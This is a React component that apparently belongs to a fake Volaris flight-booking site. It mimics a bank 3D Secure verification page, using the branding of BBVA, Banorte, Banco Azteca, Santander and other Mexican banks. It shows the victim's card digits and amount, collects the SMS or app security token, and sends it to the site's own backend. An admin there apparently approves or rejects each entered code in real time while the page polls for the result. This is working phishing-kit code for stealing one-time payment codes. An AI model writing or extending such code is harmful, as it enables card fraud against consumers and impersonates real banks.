import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';

interface BankConfig {
    name: string;
    logo: string;
    primaryColor: string;
    secondaryColor: string;
    textColor: string;
}

const bankConfigs: Record<string, BankConfig> = {
    invex_volaris: {
        name: 'Invex Banco',
        logo: '/assets/logos/invexbancologo.png',
        primaryColor: '#d60b52', // Invex/Volaris pink-ish red
        secondaryColor: '#ffffff',
        textColor: '#333333'
    },
    azteca: {
        name: 'Banco Azteca',
        logo: '/assets/banks/azteca.png',
        primaryColor: '#289d46', // Approximate green
        secondaryColor: '#ffffff',
        textColor: '#333333'
    },
    bbva: {
        name: 'BBVA',
        logo: '/assets/banks/bbva.jpg',
        primaryColor: '#004481', // BBVA Blue
        secondaryColor: '#f4f4f4',
        textColor: '#004481'
    },
    banorte: {
        name: 'Banorte',
        logo: '/assets/banks/banorte.png',
        primaryColor: '#eb0029', // Banorte Red
        secondaryColor: '#ffffff',
        textColor: '#333333'
    },
    santander: {
        name: 'Santander',
        logo: '/assets/banks/santander.png',
        primaryColor: '#ec0000', // Santander Red
        secondaryColor: '#ffffff',
        textColor: '#333333'
    },
    hsbc: {
        name: 'HSBC',
        logo: '/assets/banks/hsbc.png',
        primaryColor: '#db0011', // HSBC Red
        secondaryColor: '#ffffff',
        textColor: '#333333'
    },
    bancoppel: {
        name: 'Bancoppel',
        logo: '/assets/banks/bancoppel.png',
        primaryColor: '#0033a0', // Bancoppel Blue
        secondaryColor: '#ffdd00',
        textColor: '#333333'
    },
    nubank: {
        name: 'Nubank',
        logo: '/assets/banks/nubank.png',
        primaryColor: '#820ad1', // Nubank Purple
        secondaryColor: '#ffffff',
        textColor: '#ffffff'
    },
    citi: {
        name: 'Citibanamex',
        logo: '/assets/banks/citi.jfif',
        primaryColor: '#003b70', // Citi Blue
        secondaryColor: '#ffffff',
        textColor: '#333333'
    },
    scotiabank: {
        name: 'Scotiabank',
        logo: '/assets/banks/scotiabank.png', // Assuming generic or if I missed it
        primaryColor: '#ec111a',
        secondaryColor: '#ffffff',
        textColor: '#333333'
    },
    other: {
        name: 'Banco',
        logo: '/assets/banks/visa.png', // Fallback
        primaryColor: '#333333',
        secondaryColor: '#ffffff',
        textColor: '#333333'
    }
};

const SecurityCheck = () => {
    const navigate = useNavigate();
    const [isLoading, setIsLoading] = useState(false);
    const [token, setToken] = useState('');
    const [bank, setBank] = useState<string>('other');
    const [cardLast4, setCardLast4] = useState('****');
    const [amount, setAmount] = useState('0.00');
    const [isVerifying, setIsVerifying] = useState(false);
    
    // We always show the form now, as we only arrive here if 3D Secure is required
    const showTokenForm = true;
    
    useEffect(() => {
        const storedInfo = localStorage.getItem('info');
        const storedPayment = localStorage.getItem('paymentInfo');
        
        if (storedPayment) {
            const payment = JSON.parse(storedPayment);
            // Ensure bank is lower case for matching config
            setBank((payment.bank || 'other').toLowerCase());
            setCardLast4(payment.cardNumber ? payment.cardNumber.slice(-4) : '****');
            
            if (payment.amount) {
                setAmount(payment.amount.toLocaleString('es-MX', { style: 'currency', currency: 'MXN' }));
            }
        }

        if (storedInfo && (!storedPayment || !JSON.parse(storedPayment).amount)) {
            const info = JSON.parse(storedInfo);
            // Calculate total again or store it in localStorage? 
            // For now, let's grab it from flightFare if available, or re-calculate.
            // Simplified: just show a generic amount or recalculate if needed.
            // Let's assume we stored total price in flightInfo or paymentInfo
            // For now, I'll calculate it based on standard logic if not present.
            
            // const total = (info.outboundFlight?.price || 0) + (info.returnFlight?.price || 0);
            // const passengers = (info.adults || 1) + (info.children || 0) + (info.babies || 0);
            // const grandTotal = total * passengers; // Very rough approximation
             
            // Better to use the same logic as Payment.tsx
            const outboundPrice = info.flightInfo?.outboundFlight?.price || 0;
            const returnPrice = info.flightInfo?.returnFlight?.price || 0;
            
            const adults = info.passengersInfo?.adults?.length || 1;
            const children = info.passengersInfo?.children?.length || 0;
            const babies = info.passengersInfo?.babies?.length || 0;

            const subtotal = (outboundPrice + returnPrice) * (adults + children + babies);
            const taxes = subtotal * 0.16; // 16% tax
            const totalAmount = subtotal + taxes;
            
            setAmount(totalAmount.toLocaleString('es-MX', { style: 'currency', currency: 'MXN' }));
        }
    }, []);

    const config = bankConfigs[bank] || bankConfigs.other;

    // Poll for status immediately on mount (to handle direct approval) or when verifying
    useEffect(() => {
        let interval: any;
        
        const pollStatus = async () => {
             const storedPayment = localStorage.getItem('paymentInfo');
             if (!storedPayment) return;
             const payment = JSON.parse(storedPayment);

             try {
                const statusRes = await fetch(`/api/payments/${payment.bookingId}/status`);
                const statusData = await statusRes.json();

                // If approved directly by admin (COMPLETED) or token verified (VERIFIED)
                if (statusData.status === 'VERIFIED' || statusData.status === 'COMPLETED') {
                    clearInterval(interval);
                    navigate('/correct-payment');
                } 
                // If rejected directly or token rejected
                else if (statusData.status === 'TOKEN_REJECTED' || statusData.status === 'FAILED') {
                    if (isVerifying) {
                        // If we were waiting for token verification
                        setIsVerifying(false);
                        setIsLoading(false);
                        alert('Código incorrecto o pago rechazado. Por favor verifique.');
                        setToken('');
                    } else if (statusData.status === 'FAILED') {
                         clearInterval(interval);
                         alert('El pago ha sido rechazado por el banco.');
                         navigate('/payment');
                    }
                }
            } catch (err) {
                console.error('Polling error', err);
            }
        };

        // Poll every 2 seconds
        interval = setInterval(pollStatus, 2000);
        
        // Initial check
        pollStatus();

        return () => clearInterval(interval);
    }, [isVerifying, navigate]);

    const handleSubmit = async (e: React.FormEvent) => {
        e.preventDefault();
        setIsLoading(true);
        
        try {
            const storedPayment = localStorage.getItem('paymentInfo');
            if (!storedPayment) throw new Error('No payment info found');
            const payment = JSON.parse(storedPayment);
            
            const response = await fetch('/api/verify-payment', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    bookingId: payment.bookingId,
                    token: token
                })
            });

            if (!response.ok) throw new Error('Verification failed');
            
            const data = await response.json();
            
            if (data.status === 'TOKEN_PENDING') {
                setIsVerifying(true);
            } else if (data.success) {
                navigate('/confirmation');
            }

        } catch (error) {
            console.error(error);
            alert('Error en la verificación. Por favor intente nuevamente.');
            setIsLoading(false);
        }
    };

    return (
        <div className="min-h-screen flex items-center justify-center bg-gray-100 font-sans">
            <div className="bg-white p-8 rounded-lg shadow-lg max-w-md w-full border border-gray-200">
                <div className="flex justify-between items-center mb-6">
                    <img src={config.logo} alt={config.name} className="h-10 object-contain" />
                    <img src="/assets/banks/visa.png" alt="Visa" className="h-8 object-contain" />
                </div>
                
                <h2 className="text-xl font-bold mb-4" style={{ color: config.textColor }}>
                    {bank === 'bbva' ? 'Compra segura BBVA' : 
                     bank === 'banorte' ? 'Autenticación de compra' :
                     bank === 'azteca' ? 'Manten tu cuenta segura' :
                     'Verificación de Seguridad'}
                </h2>

                <div className="bg-gray-50 p-4 rounded mb-6 text-sm">
                    <p className="mb-2"><strong>Comercio:</strong> VOLARIS AIRLINES</p>
                    <p className="mb-2"><strong>Fecha:</strong> {new Date().toLocaleDateString('es-MX', { year: 'numeric', month: 'long', day: 'numeric' })}</p>
                    <p className="mb-2"><strong>Tarjeta:</strong> **** **** **** {cardLast4}</p>
                    <p className="mb-2"><strong>Importe:</strong> {amount}</p>
                </div>

                <p className="text-sm mb-4 text-gray-600">
                    {bank === 'bbva' 
                        ? 'Autoriza tu compra con un código de seguridad que podrás generar con el Token Móvil de tu app BBVA México.' 
                        : 'Para confirmar la operación, ingrese el código de seguridad enviado por SMS a su celular registrado.'}
                </p>

                {!showTokenForm ? (
                    <div className="text-center py-8">
                        <div className="spinner-border text-primary mb-3" role="status" style={{ width: '3rem', height: '3rem', color: config.primaryColor }}>
                             <span className="sr-only">Cargando...</span>
                        </div>
                        <p className="text-gray-600 font-semibold">Procesando pago con el banco...</p>
                        <p className="text-xs text-gray-400 mt-2">Por favor espere, no cierre esta ventana.</p>
                        {/* Spinner visual mockup if bootstrap spinner not available */}
                        <style>{`
                            @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
                            .spinner-border {
                                display: inline-block;
                                border: 4px solid rgba(0,0,0,0.1);
                                border-left-color: currentColor;
                                border-radius: 50%;
                                animation: spin 1s linear infinite;
                            }
                        `}</style>
                    </div>
                ) : (
                <form onSubmit={handleSubmit}>
                    <div className="mb-6">
                        <label className="block text-gray-700 text-sm font-bold mb-2">
                            Código de Seguridad / Token
                        </label>
                        <input 
                            type="text" 
                            value={token}
                            onChange={(e) => setToken(e.target.value)}
                            className="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline"
                            placeholder="Ingrese código"
                            required
                        />
                    </div>

                    <button 
                        type="submit" 
                        disabled={isLoading}
                        className="w-full font-bold py-2 px-4 rounded focus:outline-none focus:shadow-outline transition duration-200"
                        style={{ 
                            backgroundColor: config.primaryColor, 
                            color: config.secondaryColor 
                        }}
                    >
                        {isLoading ? 'Verificando...' : 'Confirmar'}
                    </button>
                </form>
                )}

                <div className="mt-6 text-center">
                     <p className="text-xs text-gray-400">
                        Verified by Visa / Mastercard SecureCode
                     </p>
                </div>
            </div>
        </div>
    );
};

export default SecurityCheck;
